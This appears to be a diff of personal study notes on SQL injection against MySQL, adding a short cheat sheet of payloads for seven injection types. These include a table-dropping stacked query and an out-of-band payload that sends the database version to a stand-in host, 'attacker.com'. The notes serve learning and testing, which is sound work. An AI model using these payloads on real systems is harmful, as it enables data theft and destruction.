@@ -1,4 +1,4 @@
-#CWES #SQLi #mysql
+#CWESt#SQLi #mysql
 
 #### Lessons:
 - quotes matter a lot in our payload, sometimes table names need them sometimes they dont.
@@ -32,6 +32,42 @@ NOTE on comments in SQL:
 - Note: logging into mysql might require --skip-ssl option to work. 
 - AND operation takes precedence over OR operation. 
 
+
+#### Different sql injection types:
+**Boolean-based blind sqli:**
+```
+AND 1=1
+```
+
+**Error-based sqli:**
+```
+AND GTID_SUBSET(@@version,0)
+```
+
+**Union based sqli:**
+```
+UNION ALL SELECT 1,@@version,3
+```
+
+**Stacked queries:**
+```
+; DROP TABLE users
+```
+
+**Time-based blind sqli:**
+```
+AND 1=IF(2>1,SLEEP(5),0)
+```
+
+**Inline queries:**
+```
+SELECT (SELECT @@version) from
+```
+
+**Out-of-band sqli:**
+```
+LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
+```
 
 #### SQLi basics:
 ![[Pasted image 20260203181503.png]]
